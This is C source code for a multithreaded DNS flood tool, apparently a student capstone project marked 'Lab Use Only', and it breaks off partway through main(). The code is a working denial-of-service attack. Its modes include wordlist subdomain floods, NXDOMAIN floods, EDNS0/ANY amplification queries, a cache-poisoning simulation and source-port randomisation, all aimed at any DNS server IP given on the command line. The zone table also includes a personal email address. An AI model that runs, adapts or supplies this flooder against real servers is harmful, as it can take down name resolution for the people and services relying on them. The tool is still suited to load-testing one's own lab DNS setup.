#define _DEFAULT_SOURCE
#define _BSD_SOURCE
#define _SVID_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <math.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/wait.h>
#include <getopt.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#define CLASS_INET      1
#define MAX_THREADS     20
#define STATS_INTERVAL  1000

/* ─── ANSI colours & styles ──────────────────────────────────── */
#define C_RESET   "\033[0m"
#define C_BOLD    "\033[1m"
#define C_DIM     "\033[2m"
#define C_RED     "\033[91m"
#define C_GREEN   "\033[92m"
#define C_YELLOW  "\033[93m"
#define C_BLUE    "\033[94m"
#define C_MAGENTA "\033[95m"
#define C_CYAN    "\033[96m"
#define C_WHITE   "\033[97m"
#define C_BGRED   "\033[41m"
#define C_BGBLACK "\033[40m"
#define CUR_HIDE  "\033[?25l"
#define CUR_SHOW  "\033[?25h"
#define CLEAR_LINE "\033[2K\r"

/* Default wordlist paths — MANDATORY, no random fallback */
#define DEFAULT_WORDLIST         "/home/paifern/n0kovo_subdomains/n0kovo_subdomains_huge.txt"
#define DEFAULT_NXDOMAIN_WORDLIST "/home/paifern/n0kovo_subdomains/n0kovo_subdomains_large.txt"
#define MAX_WORDLIST_ENTRIES 3000000
#define MAX_WORD_LEN         128

/* DNS Response Codes */
#define RCODE_NOERROR   0
#define RCODE_NXDOMAIN  3
#define RCODE_SERVFAIL  2
#define RCODE_REFUSED   5

/* Complete DNS Record Types */
enum dns_type {
    TYPE_A     = 1,
    TYPE_NS    = 2,
    TYPE_CNAME = 5,
    TYPE_SOA   = 6,
    TYPE_PTR   = 12,
    TYPE_MX    = 15,
    TYPE_TXT   = 16,
    TYPE_RP    = 17,   /* Responsible Person */
    TYPE_AAAA  = 28,
    TYPE_DNAME = 39,   /* DNAME delegation */
    TYPE_ANY   = 255,
    TYPE_ANAME = 258,
};

/*
 * Zone records mirroring the live Technitium DNS configuration:
 *
 *  #  Name    Type   Data
 *  1  @       DNAME  articles
 *  2  @       TXT    Hello From Capstone Server\n
 *  3  @       RP     sop98886@gmail.com
 *  4  @       MX     1 shop
 *  5  access  CNAME  admin
 *  6  @       NS     elearning.cadt.edu.kh
 *  7  @       A      192.168.44.144
 *  8  @       NS     379adf325788
 *  9  @       SOA    379adf325788 hostadmin@lab.local 1 900 300 604800 900
 */
typedef struct {
    char     name[256];   /* subdomain label; "@" means base domain  */
    uint16_t type;
    char     data[256];
} dns_record_t;

/*
 * "@" entries are expanded to config->target_domain at query-build time.
 * Named entries (e.g. "access") are prefixed: "access.<target_domain>".
 */
dns_record_t zone_records[] = {
    /* record 1 */  {"@",      TYPE_DNAME, "articles"},
    /* record 2 */  {"@",      TYPE_TXT,   "Hello From Capstone Server"},
    /* record 3 */  {"@",      TYPE_RP,    "sop98886@gmail.com"},
    /* record 4 */  {"@",      TYPE_MX,    "1 shop"},
    /* record 5 */  {"access", TYPE_CNAME, "admin"},
    /* record 6 */  {"@",      TYPE_NS,    "elearning.cadt.edu.kh"},
    /* record 7 */  {"@",      TYPE_A,     "192.168.44.144"},
    /* record 8 */  {"@",      TYPE_NS,    "379adf325788"},
    /* record 9 */  {"@",      TYPE_SOA,   "379adf325788 hostadmin.lab.local 1 900 300 604800 900"},
};
#define NUM_RECORDS (sizeof(zone_records) / sizeof(dns_record_t))

/* ─── Wordlist store ─────────────────────────────────────────── */
static char   **wl_words    = NULL;
static size_t   wl_count    = 0;
static volatile size_t wl_cursor = 0;
pthread_mutex_t wl_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ─── NXDOMAIN wordlist store ────────────────────────────────── */
static char   **nx_words    = NULL;
static size_t   nx_count    = 0;
static volatile size_t nx_cursor = 0;
pthread_mutex_t nx_mutex = PTHREAD_MUTEX_INITIALIZER;

/*
 * load_wordlist()
 * Reads every line from the wordlist into heap memory.
 * EXITS on failure — no random fallback.
 */
size_t load_wordlist(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        fprintf(stderr, C_RED "[✗] Cannot open subdomain wordlist: %s\n" C_RESET, path);
        fprintf(stderr, C_RED "[✗] This tool requires the wordlist to operate. Exiting.\n" C_RESET);
        exit(EXIT_FAILURE);
    }

    wl_words = malloc(sizeof(char *) * MAX_WORDLIST_ENTRIES);
    if (!wl_words) {
        fprintf(stderr, C_RED "[✗] malloc failed for wordlist index\n" C_RESET);
        fclose(f);
        exit(EXIT_FAILURE);
    }

    char line[MAX_WORD_LEN];
    size_t n = 0;

    while (n < (size_t)MAX_WORDLIST_ENTRIES && fgets(line, sizeof(line), f)) {
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
            line[--len] = '\0';
        if (len == 0) continue;
        wl_words[n] = strdup(line);
        if (!wl_words[n]) break;
        n++;
    }

    fclose(f);
    wl_count = n;

    if (wl_count == 0) {
        fprintf(stderr, C_RED "[✗] Wordlist is empty: %s\n" C_RESET, path);
        fprintf(stderr, C_RED "[✗] This tool requires the wordlist to operate. Exiting.\n" C_RESET);
        exit(EXIT_FAILURE);
    }

    printf(C_GREEN "[✓] Loaded %zu subdomains from: %s\n" C_RESET, wl_count, path);
    return wl_count;
}

/*
 * load_nxdomain_wordlist()
 * Reads n0kovo_subdomains_large.txt for NXDOMAIN flood mode.
 * EXITS on failure — no random fallback.
 */
size_t load_nxdomain_wordlist(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        fprintf(stderr, C_RED "[✗] Cannot open NXDOMAIN wordlist: %s\n" C_RESET, path);
        fprintf(stderr, C_RED "[✗] This tool requires the NXDOMAIN wordlist to operate. Exiting.\n" C_RESET);
        exit(EXIT_FAILURE);
    }

    nx_words = malloc(sizeof(char *) * MAX_WORDLIST_ENTRIES);
    if (!nx_words) {
        fprintf(stderr, C_RED "[✗] malloc failed for NXDOMAIN wordlist index\n" C_RESET);
        fclose(f);
        exit(EXIT_FAILURE);
    }

    char line[MAX_WORD_LEN];
    size_t n = 0;

    while (n < (size_t)MAX_WORDLIST_ENTRIES && fgets(line, sizeof(line), f)) {
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r'))
            line[--len] = '\0';
        if (len == 0) continue;
        nx_words[n] = strdup(line);
        if (!nx_words[n]) break;
        n++;
    }

    fclose(f);
    nx_count = n;

    if (nx_count == 0) {
        fprintf(stderr, C_RED "[✗] NXDOMAIN wordlist is empty: %s\n" C_RESET, path);
        fprintf(stderr, C_RED "[✗] This tool requires the NXDOMAIN wordlist to operate. Exiting.\n" C_RESET);
        exit(EXIT_FAILURE);
    }

    printf(C_GREEN "[✓] Loaded %zu entries from NXDOMAIN wordlist: %s\n" C_RESET, nx_count, path);
    return nx_count;
}

/*
 * get_nxdomain_name_from_wordlist()
 * Thread-safe: picks entries from n0kovo_subdomains_large.txt and
 * prefixes them with "nxdomain-" to guarantee NXDOMAIN responses.
 * Cycles round-robin across all threads.
 * NO random fallback — wordlist is required.
 */
void get_nxdomain_name_from_wordlist(char *buffer, const char *base_domain) {
    pthread_mutex_lock(&nx_mutex);
    size_t idx = nx_cursor % nx_count;
    nx_cursor++;
    pthread_mutex_unlock(&nx_mutex);

    if (base_domain && strlen(base_domain) > 0)
        snprintf(buffer, 512, "%s.%s", nx_words[idx], base_domain);
    else
        snprintf(buffer, 512, "%s.lab.local", nx_words[idx]);
}

/*
 * get_wordlist_subdomain()
 * Thread-safe: cycles through the loaded wordlist, wrapping around.
 * Combines the wordlist entry with the base domain:
 *   e.g.  "mail"  +  "lab.local"  →  "mail.lab.local"
 *
 * Every 4th call stacks TWO wordlist entries as nested subdomains:
 *   "vpn.mail.lab.local"
 *
 * NO random fallback — wordlist is required.
 */
void get_wordlist_subdomain(char *buffer, const char *base_domain) {
    pthread_mutex_lock(&wl_mutex);
    size_t idx1 = wl_cursor % wl_count;
    wl_cursor++;
    size_t idx2 = wl_cursor % wl_count;
    wl_cursor++;
    pthread_mutex_unlock(&wl_mutex);

    /* Every 4th query: double-stack for deeper subdomain bruteforce */
    if ((idx1 % 4) == 0) {
        snprintf(buffer, 512, "%s.%s.%s",
                 wl_words[idx2], wl_words[idx1], base_domain);
    } else {
        snprintf(buffer, 512, "%s.%s", wl_words[idx1], base_domain);
    }
}

/* Attack statistics */
typedef struct {
    unsigned long packets_sent;
    unsigned long queries_by_type[65536];
    unsigned long nxdomain_responses;
    unsigned long servfail_responses;
    unsigned long timeout_responses;
    unsigned long socket_errors;
    unsigned long successful_responses;
    double        avg_response_time;
    time_t        start_time;
    time_t        last_stats_time;
    unsigned long last_packets;
} attack_stats_t;

attack_stats_t stats = {0};
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile int running = 1;

/* Attack configuration */
typedef struct {
    int  thread_count;
    int  duration;
    int  qps;
    int  random_subdomains;
    int  random_types;
    int  dns_amplification;
    int  slow_loris;
    int  cache_poisoning;
    int  random_source_ports;
    int  dnssec_dos;
    int  nxdomain_flood;
    int  edns0_buffer;
    int  query_type;
    char wordlist_path[512];
    char nxdomain_wordlist_path[512];
    char target_domain[256];
    char dns_server[256];
} attack_config_t;

/* DNS Header */
struct __attribute__((packed)) dnshdr {
    uint16_t id;
    uint8_t  rd:1, tc:1, aa:1, opcode:4, qr:1;
    uint8_t  rcode:4, cd:1, ad:1, z:1, ra:1;
    uint16_t qdcount, ancount, nscount, arcount;
};

/* EDNS0 OPT RR */
struct __attribute__((packed)) edns0_opt {
    uint8_t  name;
    uint16_t type;
    uint16_t udp_payload;
    uint8_t  ext_rcode;
    uint8_t  edns_version;
    uint16_t z;
    uint16_t data_len;
};

void sigint_handler(int sig) {
    (void)sig;
    running = 0;
    printf("\n\n[!] Stopping... waiting for threads to cleanup...\n");
}

uint16_t get_type_from_string(const char *type_str) {
    if (strcasecmp(type_str, "A")     == 0) return TYPE_A;
    if (strcasecmp(type_str, "NS")    == 0) return TYPE_NS;
    if (strcasecmp(type_str, "MX")    == 0) return TYPE_MX;
    if (strcasecmp(type_str, "TXT")   == 0) return TYPE_TXT;
    if (strcasecmp(type_str, "RP")    == 0) return TYPE_RP;
    if (strcasecmp(type_str, "SOA")   == 0) return TYPE_SOA;
    if (strcasecmp(type_str, "AAAA")  == 0) return TYPE_AAAA;
    if (strcasecmp(type_str, "DNAME") == 0) return TYPE_DNAME;
    if (strcasecmp(type_str, "ANY")   == 0) return TYPE_ANY;
    if (strcasecmp(type_str, "ANAME") == 0) return TYPE_ANAME;
    if (strcasecmp(type_str, "CNAME") == 0) return TYPE_CNAME;
    if (strcasecmp(type_str, "PTR")   == 0) return TYPE_PTR;
    return TYPE_A;
}

void nameformat(const char *name, char *formatted) {
    char *copy = strdup(name);
    char *saveptr;
    if (!copy) { perror("strdup"); return; }

    char *token = strtok_r(copy, ".", &saveptr);
    while (token != NULL) {
        *formatted++ = (char)strlen(token);
        strcpy(formatted, token);
        formatted += strlen(token);
        token = strtok_r(NULL, ".", &saveptr);
    }
    *formatted = 0;
    free(copy);
}

int create_dns_query(unsigned char *packet, const char *domain, uint16_t qtype,
                     int use_edns0, uint16_t edns_payload, int set_nxdomain_flag) {
    (void)set_nxdomain_flag;

    struct dnshdr *dns = (struct dnshdr *)packet;
    unsigned char *qname = packet + sizeof(struct dnshdr);
    char formatted[512];
    int offset = 0;

    dns->id       = htons(rand() % 65535);
    dns->rd       = 1;
    dns->tc = dns->aa = dns->qr = dns->rcode = dns->cd = dns->ad = dns->z = dns->ra = 0;
    dns->opcode   = 0;
    dns->qdcount  = htons(1);
    dns->ancount  = dns->nscount = 0;
    dns->arcount  = use_edns0 ? htons(1) : 0;

    nameformat(domain, formatted);
    memcpy(qname, formatted, strlen(formatted) + 1);
    offset = strlen(formatted) + 1;

    uint16_t *type  = (uint16_t *)(qname + offset);
    uint16_t *class = (uint16_t *)(qname + offset + 2);
    *type  = htons(qtype);
    *class = htons(CLASS_INET);
    offset += 4;

    if (use_edns0) {
        struct edns0_opt *opt = (struct edns0_opt *)(qname + offset);
        opt->name         = 0;
        opt->type         = htons(41);
        opt->udp_payload  = htons(edns_payload);
        opt->ext_rcode    = 0;
        opt->edns_version = 0;
        opt->z            = 0;
        opt->data_len     = 0;
        offset += sizeof(struct edns0_opt);
    }

    return sizeof(struct dnshdr) + offset;
}

/* ─── Attack thread ──────────────────────────────────────────── */
void *attack_thread(void *arg) {
    attack_config_t *config = (attack_config_t *)arg;

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        pthread_mutex_lock(&stats_mutex);
        stats.socket_errors++;
        pthread_mutex_unlock(&stats_mutex);
        return NULL;
    }

    /* Non-blocking socket for maximum throughput */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    /* Increase socket send buffer */
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in dest = {
        .sin_family = AF_INET,
        .sin_port   = htons(53)
    };
    inet_pton(AF_INET, config->dns_server, &dest.sin_addr);

    unsigned char packet[4096];
    unsigned char response[4096];
    char domain[512];

    /* Per-thread QPS */
    struct timespec req = {0, 0};
    if (config->qps > 0) {
        long ns = 1000000000L / (config->qps / config->thread_count);
        req.tv_sec  = ns / 1000000000L;
        req.tv_nsec = ns % 1000000000L;
    }

    while (running) {

        /* ── Choose domain ─────────────────────────────────── */
        if (config->nxdomain_flood) {
            /* Always from NXDOMAIN wordlist */
            get_nxdomain_name_from_wordlist(domain, config->target_domain);

        } else if (config->random_subdomains) {
            /* Always from subdomain wordlist */
            get_wordlist_subdomain(domain, config->target_domain);

        } else if (config->dns_amplification) {
            strcpy(domain, config->target_domain);
            int len = create_dns_query(packet, domain, TYPE_ANY, 1, 4096, 0);

            if (config->random_source_ports) {
                struct sockaddr_in local = {
                    .sin_family      = AF_INET,
                    .sin_addr.s_addr = INADDR_ANY,
                    .sin_port        = htons(1024 + (rand() % 64511))
                };
                bind(sock, (struct sockaddr *)&local, sizeof(local));
            }

            ssize_t sent = sendto(sock, packet, len, 0,
                                  (struct sockaddr *)&dest, sizeof(dest));
            if (sent > 0) {
                pthread_mutex_lock(&stats_mutex);
                stats.packets_sent++;
                stats.queries_by_type[TYPE_ANY]++;
                pthread_mutex_unlock(&stats_mutex);
            }
            if (config->qps > 0) nanosleep(&req, NULL);
            continue;

        } else if (config->cache_poisoning) {
            strcpy(domain, config->target_domain);
            for (int i = 0; i < 10 && running; i++) {
                int len = create_dns_query(packet, domain, TYPE_A, 0, 512, 0);
                sendto(sock, packet, len, 0, (struct sockaddr *)&dest, sizeof(dest));
                pthread_mutex_lock(&stats_mutex);
                stats.packets_sent++;
                stats.queries_by_type[TYPE_A]++;
                pthread_mutex_unlock(&stats_mutex);
                usleep(500);
            }
            socklen_t addr_len = sizeof(dest);
            int recv_len = recvfrom(sock, response, sizeof(response), 0,
                                    (struct sockaddr *)&dest, &addr_len);
            if (recv_len > 0) {
                pthread_mutex_lock(&stats_mutex);
                stats.successful_responses++;
                pthread_mutex_unlock(&stats_mutex);
            }
            continue;

        } else {
            /* Pick a random zone record and expand "@" / named labels */
            int record_idx = rand() % NUM_RECORDS;
            const char *rec_name = zone_records[record_idx].name;
            if (strcmp(rec_name, "@") == 0) {
                strncpy(domain, config->target_domain, sizeof(domain) - 1);
            } else {
                snprintf(domain, sizeof(domain), "%s.%s",
                         rec_name, config->target_domain);
            }
        }

        /* ── Choose query type ─────────────────────────────── */
        uint16_t qtype;
        if (config->random_types) {
            /*
             * All types present in the live Technitium zone:
             * A, NS, MX, TXT, RP, SOA, AAAA, DNAME, CNAME, ANY
             */
            uint16_t aggressive_types[] = {
                TYPE_A, TYPE_NS, TYPE_MX, TYPE_TXT,
                TYPE_RP, TYPE_SOA, TYPE_AAAA, TYPE_DNAME,
                TYPE_CNAME, TYPE_ANY
            };
            qtype = aggressive_types[rand() % 10];
        } else if (config->query_type > 0) {
            qtype = config->query_type;
        } else {
            qtype = TYPE_A;
        }

        /* ── Build & send packet ───────────────────────────── */
        int len = create_dns_query(packet, domain, qtype,
                                   config->edns0_buffer ? 1 : 0,
                                   config->edns0_buffer ? 4096 : 512, 0);

        if (config->random_source_ports) {
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            int f2 = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, f2 | O_NONBLOCK);
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

            struct sockaddr_in local = {
                .sin_family      = AF_INET,
                .sin_addr.s_addr = INADDR_ANY,
                .sin_port        = htons(1024 + (rand() % 64511))
            };
            bind(sock, (struct sockaddr *)&local, sizeof(local));
        }

        ssize_t sent = sendto(sock, packet, len, 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        if (sent > 0) {
            pthread_mutex_lock(&stats_mutex);
            stats.packets_sent++;
            stats.queries_by_type[qtype]++;
            pthread_mutex_unlock(&stats_mutex);
        }

        if (config->qps > 0) nanosleep(&req, NULL);
    }

    close(sock);
    return NULL;
}

/* ─── Stats thread — animated live dashboard ─────────────────── */
void *stats_thread(void *arg) {
    (void)arg;

    const char *spin[] = { "⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏" };
    const char *bar_colors[] = { C_RED, C_YELLOW, C_GREEN, C_CYAN, C_MAGENTA };
    int   spin_idx  = 0;
    int   color_idx = 0;
    int   tick      = 0;

    printf("\n\n\n\n\n\n\n");
    fflush(stdout);

    while (running) {
        usleep(120000);

        time_t now = time(NULL);
        pthread_mutex_lock(&stats_mutex);
        unsigned long cur     = stats.packets_sent;
        double        qps     = (double)(cur - stats.last_packets) / 0.12;
        time_t        elapsed = now - stats.start_time;
        unsigned long errs    = stats.socket_errors;
        unsigned long resps   = stats.successful_responses;
        size_t        wl_pos  = wl_cursor % (wl_count  ? wl_count  : 1);
        size_t        nx_pos  = nx_cursor % (nx_count  ? nx_count  : 1);
        stats.last_packets    = cur;
        stats.last_stats_time = now;
        pthread_mutex_unlock(&stats_mutex);

        int bar_w  = 30;
        int filled = (int)(qps / 1000.0);
        if (filled > bar_w) filled = bar_w;

        printf("\033[7A");

        /* Line 1 — spinner + status */
        printf(CLEAR_LINE "%s%s%s " C_WHITE C_BOLD "DNS STRESS" C_RESET
               C_DIM "  ·  " C_RESET
               C_CYAN "elapsed " C_YELLOW "%lds" C_RESET
               C_DIM "  ·  " C_RESET
               C_GREEN "packets " C_WHITE C_BOLD "%lu\n" C_RESET,
               bar_colors[color_idx], spin[spin_idx], C_RESET,
               elapsed, cur);

        /* Line 2 — QPS bar */
        printf(CLEAR_LINE "  " C_CYAN "QPS  " C_RESET "[");
        for (int i = 0; i < filled; i++)
            printf("%s█" C_RESET, bar_colors[color_idx]);
        for (int i = filled; i < bar_w; i++)
            printf(C_DIM "░" C_RESET);
        printf("] " C_YELLOW C_BOLD "%.0f/s\n" C_RESET, qps);

        /* Line 3 — wordlist progress */
        int wl_pct = wl_count  ? (int)((wl_pos  * 100) / wl_count)  : 0;
        int nx_pct = nx_count  ? (int)((nx_pos  * 100) / nx_count)  : 0;
        printf(CLEAR_LINE "  " C_MAGENTA "WORDLIST " C_RESET
               "[" C_GREEN "%zu" C_RESET "/" C_DIM "%zu" C_RESET "]"
               " " C_YELLOW "%d%%" C_RESET
               C_DIM "   NXLIST " C_RESET
               "[" C_GREEN "%zu" C_RESET "/" C_DIM "%zu" C_RESET "]"
               " " C_YELLOW "%d%%\n" C_RESET,
               wl_pos, wl_count, wl_pct,
               nx_pos, nx_count, nx_pct);

        /* Line 4 — errors / responses */
        printf(CLEAR_LINE "  " C_RED "ERRORS  " C_WHITE C_BOLD "%-8lu" C_RESET
               "   " C_GREEN "RESPONSES  " C_WHITE C_BOLD "%lu\n" C_RESET,
               errs, resps);

        /* Line 5 — animated threat meter */
        double threat = qps / 500.0;
        if (threat > 1.0) threat = 1.0;
        int t_fill = (int)(threat * 30);
        printf(CLEAR_LINE "  " C_RED "THREAT  " C_RESET "[");
        for (int i = 0; i < t_fill; i++) {
            if (i < 10)      printf(C_GREEN  "█" C_RESET);
            else if (i < 20) printf(C_YELLOW "█" C_RESET);
            else             printf(C_RED    "█" C_RESET);
        }
        for (int i = t_fill; i < 30; i++) printf(C_DIM "░" C_RESET);
        printf("]\n");

        /* Line 6 — last fired domain */
        printf(CLEAR_LINE "  " C_DIM "firing  " C_RESET
               C_CYAN "%s[%zu].%s" C_RESET "\n",
               wl_count ? wl_words[wl_pos % (wl_count ? wl_count : 1)] : "n/a",
               wl_pos,
               "lab.local");

        /* Line 7 — separator */
        printf(CLEAR_LINE C_DIM
               "  ────────────────────────────────────────────────────\n"
               C_RESET);

        fflush(stdout);

        spin_idx  = (spin_idx  + 1) % 10;
        color_idx = (color_idx + (tick % 20 == 0 ? 1 : 0)) % 5;
        tick++;
    }
    return NULL;
}

/* ─── Animated banner helpers ───────────────────────────────── */

static void typewrite(const char *color, const char *s, unsigned int delay_us) {
    fputs(color, stdout);
    for (; *s; s++) {
        putchar(*s);
        fflush(stdout);
        usleep(delay_us);
    }
    fputs(C_RESET, stdout);
}

static void glitch_line(const char *line, int flickers) {
    const char *glitch_chars = "@#$%&?!*~";
    size_t len = strlen(line);
    for (int f = 0; f < flickers; f++) {
        fputs(CLEAR_LINE, stdout);
        fputs(C_RED C_BOLD, stdout);
        for (size_t i = 0; i < len; i++) {
            if (rand() % 6 == 0)
                putchar(glitch_chars[rand() % 9]);
            else
                putchar(line[i]);
        }
        fputs(C_RESET, stdout);
        fflush(stdout);
        usleep(55000);
    }
    fputs(CLEAR_LINE, stdout);
    fputs(C_RED C_BOLD, stdout);
    fputs(line, stdout);
    fputs(C_RESET "\n", stdout);
    fflush(stdout);
}

static void loading_bar(const char *label, int steps, int step_us) {
    int width = 40;
    fputs(CUR_HIDE, stdout);
    for (int i = 0; i <= steps; i++) {
        int filled = (i * width) / steps;
        int pct    = (i * 100) / steps;
        fputs(CLEAR_LINE, stdout);
        fprintf(stdout, C_CYAN "%s " C_RESET "[" C_GREEN, label);
        for (int j = 0; j < filled; j++)  putchar('#');
        fputs(C_DIM, stdout);
        for (int j = filled; j < width; j++) putchar('.');
        fprintf(stdout, C_RESET "] " C_YELLOW "%3d%%" C_RESET, pct);
        fflush(stdout);
        usleep(step_us);
    }
    putchar('\n');
    fputs(CUR_SHOW, stdout);
}

static void animated_countdown(int secs) {
    const char *colors[] = { C_RED, C_YELLOW, C_GREEN };
    for (int i = secs; i > 0; i--) {
        fputs(CLEAR_LINE, stdout);
        fprintf(stdout, C_BOLD "%s[!] Launching in %d...%s",
                colors[(secs - i) % 3], i, C_RESET);
        fflush(stdout);
        sleep(1);
    }
    fputs(CLEAR_LINE, stdout);
    fprintf(stdout, C_RED C_BOLD "[!!!] FIRE!\n" C_RESET);
    fflush(stdout);
}

void print_banner() {
    printf("\033[2J\033[H");

    usleep(120000);
    glitch_line("  ██████╗ ███╗   ██╗███████╗    ███████╗████████╗██████╗ ███████╗███████╗███████╗", 4);
    usleep(40000);
    typewrite(C_RED C_BOLD,
        "  ██╔══██╗████╗  ██║██╔════╝    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝\n", 800);
    typewrite(C_RED C_BOLD,
        "  ██║  ██║██╔██╗ ██║███████╗    ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗\n", 800);
    typewrite(C_MAGENTA C_BOLD,
        "  ██║  ██║██║╚██╗██║╚════██║    ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║\n", 800);
    typewrite(C_MAGENTA C_BOLD,
        "  ██████╔╝██║ ╚████║███████║    ███████║   ██║   ██║  ██║███████╗███████║███████║\n", 800);
    typewrite(C_DIM C_WHITE,
        "  ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\n", 500);

    printf("\n");
    printf(C_RED   "  ╔══════════════════════════════════════════════════════════════╗\n" C_RESET);
    printf(C_RED   "  ║  " C_WHITE C_BOLD "  DNS Security Testing Tool  " C_DIM "·" C_RESET C_CYAN "  Capstone Project  " C_RED "       ║\n" C_RESET);
    printf(C_RED   "  ║  " C_DIM   "  Wordlist: n0kovo_subdomains_huge  " C_RED "|" C_YELLOW "  Lab Use Only  " C_RED "     ║\n" C_RESET);
    printf(C_RED   "  ╚══════════════════════════════════════════════════════════════╝\n" C_RESET);
    printf("\n");
    fflush(stdout);
}

void print_usage(char *progname) {
    print_banner();
    printf("\nUsage: %s <dns_server> <target_domain> [options]\n\n", progname);
    printf("Required:\n");
    printf("  dns_server        IP of DNS server (e.g., 192.168.18.143)\n");
    printf("  target_domain     Domain to target (e.g., lab.local)\n\n");
    printf("Attack Options:\n");
    printf("  -t N              Number of threads (1-%d, default: 4)\n", MAX_THREADS);
    printf("  -d N              Duration in seconds (default: 60)\n");
    printf("  -r N              Queries per second total (default: 1000)\n");
    printf("  -w PATH           Subdomain wordlist (default: %s)\n", DEFAULT_WORDLIST);
    printf("  -W PATH           NXDOMAIN wordlist  (default: %s)\n", DEFAULT_NXDOMAIN_WORDLIST);
    printf("  --type TYPE       Query type (A, NS, MX, TXT, ANY, etc)\n");
    printf("  --random-subdomains   Wordlist subdomain flood (requires -w wordlist)\n");
    printf("  --random-types        Randomize query types\n");
    printf("  --amplification       DNS amplification (EDNS0 + ANY)\n");
    printf("  --cache-poison        Cache poisoning simulation\n");
    printf("  --random-ports        New socket per packet (true port randomization)\n");
    printf("  --nxdomain-flood      NXDOMAIN flood (requires -W wordlist)\n");
    printf("  --edns0-buffer        Large EDNS0 buffer (4096)\n");
    printf("  --all-attacks         Enable everything\n\n");
    printf("NOTE: Wordlists are REQUIRED. The tool will exit if they cannot be loaded.\n\n");
    printf("Example:\n");
    printf("  %s 192.168.18.143 lab.local -t 8 -r 5000 --random-subdomains --random-ports\n", progname);
    printf("  %s 192.168.18.143 lab.local --all-attacks -t 16 -r 20000 -d 120\n\n", progname);
}

int main(int argc, char **argv) {
    attack_config_t config = {
        .thread_count        = 4,
        .duration            = 60,
        .qps                 = 1000,
        .random_subdomains   = 0,
        .random_types        = 0,
        .dns_amplification   = 0,
        .cache_poisoning     = 0,
        .random_source_ports = 0,
        .slow_loris          = 0,
        .dnssec_dos          = 0,
        .nxdomain_flood      = 0,
        .edns0_buffer        = 0,
        .query_type          = 0,
    };
    strncpy(config.wordlist_path,         DEFAULT_WORDLIST,         sizeof(config.wordlist_path) - 1);
    strncpy(config.nxdomain_wordlist_path, DEFAULT_NXDOMAIN_WORDLIST, sizeof(config.nxdomain_wordlist_path) - 1);

    signal(SIGINT, sigint_handler);
    srand(time(NULL) ^ getpid());

    if (argc < 3) { print_usage(argv[0]); return 1; }

    strncpy(config.dns_server,    argv[1], sizeof(config.dns_server) - 1);
    strncpy(config.target_domain, argv[2], sizeof(config.target_domain) - 1);

    for (int i = 3; i < argc; i++) {
        if      (strcmp(argv[i], "-t") == 0 && i+1 < argc) {
            config.thread_count = atoi(argv[++i]);
            if (config.thread_count > MAX_THREADS) config.thread_count = MAX_THREADS;
            if (config.thread_count < 1)           config.thread_count = 1;
        }
        else if (strcmp(argv[i], "-d") == 0 && i+1 < argc) config.duration   = atoi(argv[++i]);
        else if (strcmp(argv[i], "-r") == 0 && i+1 < argc) config.qps        = atoi(argv[++i]);
        else if (strcmp(argv[i], "-w") == 0 && i+1 < argc)
            strncpy(config.wordlist_path, argv[++i], sizeof(config.wordlist_path) - 1);
        else if (strcmp(argv[i], "-W") == 0 && i+1 < argc)
            strncpy(config.nxdomain_wordlist_path, argv[++i], sizeof(config.nxdomain_wordlist_path) - 1);
        else if (strcmp(argv[i], "--type")              == 0 && i+1 < argc)
            config.query_type = get_type_from_string(argv[++i]);
        else if (strcmp(argv[i], "--random-subdomains") == 0) config.random_subdomains   = 1;
        else if (strcmp(argv[i], "--random-types")      == 0) config.random_types        = 1;
        else if (strcmp(argv[i], "--amplification")     == 0) config.dns_amplification   = 1;
        else if (strcmp(argv[i], "--cache-poison")      == 0) config.cache_poisoning     = 1;
        else if (strcmp(argv[i], "--random-ports")      == 0) config.random_source_ports = 1;
        else if (strcmp(argv[i], "--nxdomain-flood")    == 0) config.nxdomain_flood      = 1;
        else if (strcmp(argv[i], "--edns0-buffer")      == 0) config.edns0_buffer        = 1;
        else if (strcmp(argv[i], "--all-attacks")       == 0) {
            config.random_subdomains = config.random_types = config.dns_amplification =
            config.cache_poisoning   = config.random_source_ports = config.nxdomain_flood =
            config.edns0_buffer      = 1;
        }
    }

    /* ── Load wordlists — MANDATORY, exits on failure ── */
    if (config.random_subdomains) {
        printf(C_CYAN "[*] Loading subdomain wordlist...\n" C_RESET);
        loading_bar("  subdomains", 40, 18000);
        load_wordlist(config.wordlist_path);   /* exits on failure */
    }

    if (config.nxdomain_flood) {
        printf(C_CYAN "[*] Loading NXDOMAIN wordlist...\n" C_RESET);
        loading_bar("  nxdomain  ", 40, 18000);
        load_nxdomain_wordlist(config.nxdomain_wordlist_path);   /* exits on failure */
    }

    print_banner();
    printf(C_WHITE "  Target " C_RED "►" C_RESET " " C_YELLOW C_BOLD "%s" C_RESET
           C_DIM "  (" C_RESET C_CYAN "%s" C_RESET C_DIM ")\n" C_RESET,
           config.target_domain, config.dns_server);
    printf(C_DIM   "  ────────────────────────────────────────────────────\n" C_RESET);

    char rate_str[32];
